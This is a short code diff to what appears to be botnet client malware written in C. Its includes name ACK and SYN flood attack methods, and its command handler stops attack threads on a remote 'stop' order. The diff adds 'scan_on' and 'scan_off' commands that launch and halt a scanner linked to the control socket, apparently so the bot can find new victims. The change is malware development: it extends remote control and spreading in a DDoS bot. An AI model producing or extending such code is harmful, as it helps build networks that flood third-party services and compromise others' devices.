@@ -17,6 +17,7 @@
 
 #include "headers/attack_params.h"
 #include "headers/manager.h"
+#include "headers/scanner.h"
 
 #include "methods/ack_attack.h"
 #include "methods/syn_attack.h"
@@ -193,6 +194,16 @@ void handle_command(char* command, int sock) {
 
     if (strcmp(command, "stop") == 0) {
         cleanup_attack_threads();
+        return;
+    }
+
+    if (strncmp(command, "scan_on", 7) == 0) {
+        scanner_start(sock);
+        return;
+    }
+
+    if (strncmp(command, "scan_off", 8) == 0) {
+        scanner_stop();
         return;
     }
 
